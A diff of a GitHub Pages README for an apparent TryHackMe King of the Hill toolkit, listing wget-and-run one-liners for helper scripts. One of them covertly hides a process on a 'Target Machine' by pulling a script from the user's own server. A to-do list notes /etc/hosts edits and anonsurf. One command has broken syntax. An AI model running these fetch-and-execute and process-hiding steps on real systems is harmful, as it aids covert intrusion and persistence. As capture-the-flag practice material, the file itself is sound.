@@ -1,37 +1,71 @@
-## Welcome to GitHub Pages
+>בס״ד
+<div align="center">
 
-You can use the [editor on GitHub](https://github.com/Anlominus/KoTH/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+![image](https://user-images.githubusercontent.com/51442719/172729066-1293d382-4a31-4f03-8c23-ab0ea5f611a0.png)
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+# [`Anlominus`](https://github.com/Anlominus) 🤴 [King of the Hill](https://tryhackme.com/games/koth) `BETA`
 
-### Markdown
+---
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
-```markdown
-Syntax highlighted code block
+</div>
 
-# Header 1
-## Header 2
-### Header 3
+---
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+# 📜 KoTH Menu ~ To Do
+- 📜 Menu
+### 1️⃣ ~ [`KoTH`](./KoTH) ~> TryHackMe VPN
+> Simple helper script for VPN, VM's, etc
+```shell
+wget https://raw.githubusercontent.com/Anlominus/KoTH/main/KoTH; chmod +x KoTH; ./KoTH
 ```
 
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
+---
 
-### Jekyll Themes
+### 2️⃣ ~ [`KoTH-Protection`](./KoTH-Protection) ~> Protecting Rank in King of The Hill
+> A script to protect your king
+```shell
+wget https://raw.githubusercontent.com/Anlominus/KoTH/main/KoTH-Protection ; chmod +x KoTH-Protection; ./KoTH-Protection
+```
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Anlominus/KoTH/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+---
 
-### Support or Contact
+### 3️⃣ ~ [`KoTh-Hidding`](./KoTh-Hidding) ~> A simple script to hide a process with mount
+```shell
+wget https://raw.githubusercontent.com/Anlominus/KoTH/main/KoTH-Hidding; && chmod +x KoTh-Hidding; ./KoTh-Hidding
+```
+> - Start local server <br>
+>   - `python3 -m http.server 80` <br>
+> - in the Target Machine <br>
+>   - `wget http://yourvpnip/KoTh-Hidding && chmod +x KoTh-Hidding && ./KoTh-Hidding`
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+---
+
+# TryHackMe Menu ToDo
+
+---
+
+- [x] Scope
+  - [ ] 1️⃣ Asking For Username:
+  - [ ] 2️⃣ Asking For TryHackMe VPN File Location:
+  - [ ] 3️⃣ Asking Data for Reporting:
+  - [ ] 4️⃣ Asking Location For Reporting:
+  - [ ] 5️⃣ Asking For IP Target: +~> Insert it to ${box_ip}
+  - [ ] 6️⃣ Asking For Name Target: +~> Insert it to ${box_name}
+
+---
+
+  - [ ] 1️⃣ Adding ${box_ip} ${box_name} ~>> /etc/hosts
+    - `sudo echo "${box_ip}   ${box_name}" >> /etc/hosts`  
+  - [ ] 2️⃣ Asking For TryHackMe VPN File Location:
+  - [ ] 3️⃣ Asking Location for Reporting:
+
+---
+
+- [x] Anonymity Surfing
+    - [x] anonsurf status
+    - [x] anonsurf start
+    - [x] anonsurf stop
+
+---
+
